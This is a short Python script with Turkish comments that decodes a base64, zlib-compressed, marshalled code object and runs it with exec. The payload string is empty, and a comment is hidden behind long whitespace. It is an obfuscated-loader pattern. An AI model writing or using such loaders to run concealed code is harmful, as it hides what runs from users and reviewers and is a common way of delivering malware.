#!/usr/bin/env python3
import base64
import zlib
import marshal
import requests
import time
import os
import sys
                                                                                                # Obfuscated code
ENCODED_CODE = b''

def main():
    try:
        # Decode işlemi
        compressed = base64.b64decode(ENCODED_CODE)
        marshaled = zlib.decompress(compressed)
        code_obj = marshal.loads(marshaled)

        # Kodu çalıştır
        exec(code_obj)
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()